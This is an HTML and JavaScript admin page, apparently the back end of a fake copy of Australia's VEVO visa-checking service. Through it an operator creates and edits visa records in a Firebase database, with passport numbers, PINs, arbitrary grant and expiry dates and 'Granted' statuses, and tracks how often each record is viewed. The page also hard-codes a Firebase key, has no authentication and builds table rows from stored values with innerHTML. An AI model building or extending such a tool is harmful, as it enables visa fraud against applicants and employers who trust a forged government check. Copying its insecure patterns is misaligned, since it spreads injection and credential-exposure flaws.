<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <title>Admin - VEVO Advanced Control</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
<link rel="icon" type="image/x-icon" href="https://uploads.onecompiler.io/44ncz8e5z/44nd5m7sn/13898.png">
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f0f4f8; padding: 20px; }
        .admin-card { max-width: 800px; margin: auto; background: white; padding: 25px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
        h2 { color: #003066; text-align: center; border-bottom: 2px solid #003066; padding-bottom: 10px; }
        .grid-inputs { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
        input, textarea, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 14px; }
        textarea { grid-column: span 2; height: 80px; }
        .full-width { grid-column: span 2; }
        .btn-add { background: #003066; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 10px; transition: 0.3s; }
        .btn-add:hover { background: #0056b3; }
        
        .data-list { margin-top: 40px; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; background: white; font-size: 12px; border-radius: 8px; overflow: hidden; }
        th, td { border: 1px solid #eee; padding: 12px; text-align: left; }
        th { background: #003066; color: white; text-transform: uppercase; }
        tr:hover { background: #f9f9f9; }
        .btn-edit { background: #ffc107; color: black; border: none; padding: 6px 12px; cursor: pointer; border-radius: 4px; font-weight: bold; }
        .btn-del { background: #dc3545; color: white; border: none; padding: 6px 12px; cursor: pointer; border-radius: 4px; font-weight: bold; }
        .view-badge { background: #17a2b8; color: white; padding: 3px 8px; border-radius: 20px; font-size: 10px; }
    </style>
</head>
<body>

<div class="admin-card">
    <h2>VEVO Admin Dashboard (Australia)</h2>
    
    <div class="grid-inputs">
        <input type="text" id="aPass" placeholder="Passport Number (User ID)">
        <input type="text" id="aPin" placeholder="4 Digit PIN">
        
        <input type="text" id="aFamilyName" placeholder="Family Name">
        <input type="text" id="aVisaDesc" placeholder="Visa Description (e.g. VISITOR)">
        
        <input type="text" id="aDocNum" placeholder="Document Number (Leave blank to use Passport)">
        <input type="text" id="aVisaClass" placeholder="Visa Class/Subclass (e.g. 600)">
        
        <input type="text" id="aGrantDate" placeholder="Visa Grant Date (DD MMM YYYY)">
        <input type="text" id="aExpiryDate" placeholder="Visa Expiry Date (DD MMM YYYY)">
        
        <input type="text" id="aDate" placeholder="Update Date (Table)">
        <input type="text" id="aTime" placeholder="Update Time (Table)">
        
        <textarea id="aStatus" placeholder="Status Title (e.g. In-Effect / Granted)"></textarea>
        
        <button class="btn-add full-width" onclick="saveData()">SAVE / UPDATE VISA RECORD</button>
    </div>

    <div class="data-list">
        <h3>Live Visa Records</h3>
        <table id="dataTable">
            <thead>
                <tr>
                    <th>Passport</th>
                    <th>Name</th>
                    <th>PIN</th>
                    <th>Grant Date</th>
                    <th>Views</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody id="tableBody"></tbody>
        </table>
    </div>
</div>

<script>
    // আপনার Firebase Config
    const firebaseConfig = {
        apiKey: "AIzaSyDgiL1iFUfbs1iaP6v_YPadbn49eiku1WE",
        databaseURL: "https://webpagecybersecurity-default-rtdb.firebaseio.com",
        projectId: "webpagecybersecurity",
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // ডাটা সেভ করা
    function saveData() {
        const pass = document.getElementById('aPass').value.trim();
        if(!pass) return alert("পাসপোর্ট নাম্বার অবশ্যই দিতে হবে!");

        db.ref('visas/' + pass).update({
            pin: document.getElementById('aPin').value,
            family_name: document.getElementById('aFamilyName').value,
            visa_desc: document.getElementById('aVisaDesc').value,
            doc_num: document.getElementById('aDocNum').value || pass,
            visa_class: document.getElementById('aVisaClass').value,
            grant_date: document.getElementById('aGrantDate').value,
            expiry_date: document.getElementById('aExpiryDate').value,
            status: document.getElementById('aStatus').value,
            date: document.getElementById('aDate').value,
            time: document.getElementById('aTime').value,
            views: 0
        }).then(() => {
            alert("Record Updated Successfully!");
            clearFields();
        });
    }

    // টেবিল আপডেট (Real-time)
    db.ref('visas').on('value', (snapshot) => {
        const tableBody = document.getElementById('tableBody');
        tableBody.innerHTML = "";
        snapshot.forEach((childSnapshot) => {
            const key = childSnapshot.key;
            const data = childSnapshot.val();
            tableBody.innerHTML += `
                <tr>
                    <td><b>${key}</b></td>
                    <td>${data.family_name || 'N/A'}</td>
                    <td>${data.pin}</td>
                    <td>${data.grant_date || 'N/A'}</td>
                    <td><span class="view-badge">${data.views || 0}</span></td>
                    <td>
                        <button class="btn-edit" onclick="editData('${key}')">Edit</button>
                        <button class="btn-del" onclick="deleteData('${key}')">Del</button>
                    </td>
                </tr>
            `;
        });
    });

    function editData(id) {
        db.ref('visas/' + id).once('value').then((snap) => {
            const d = snap.val();
            document.getElementById('aPass').value = id;
            document.getElementById('aPin').value = d.pin || "";
            document.getElementById('aFamilyName').value = d.family_name || "";
            document.getElementById('aVisaDesc').value = d.visa_desc || "";
            document.getElementById('aDocNum').value = d.doc_num || "";
            document.getElementById('aVisaClass').value = d.visa_class || "";
            document.getElementById('aGrantDate').value = d.grant_date || "";
            document.getElementById('aExpiryDate').value = d.expiry_date || "";
            document.getElementById('aStatus').value = d.status || "";
            document.getElementById('aDate').value = d.date || "";
            document.getElementById('aTime').value = d.time || "";
            window.scrollTo({top: 0, behavior: 'smooth'});
        });
    }

    function deleteData(id) {
        if(confirm("আপনি কি নিশ্চিতভাবে এই রেকর্ডটি ডিলিট করতে চান?")) {
            db.ref('visas/' + id).remove();
        }
    }

    function clearFields() {
        const ids = ['aPass','aPin','aFamilyName','aVisaDesc','aDocNum','aVisaClass','aGrantDate','aExpiryDate','aStatus','aDate','aTime'];
        ids.forEach(id => document.getElementById(id).value = "");
    }
</script>
</body>
</html>
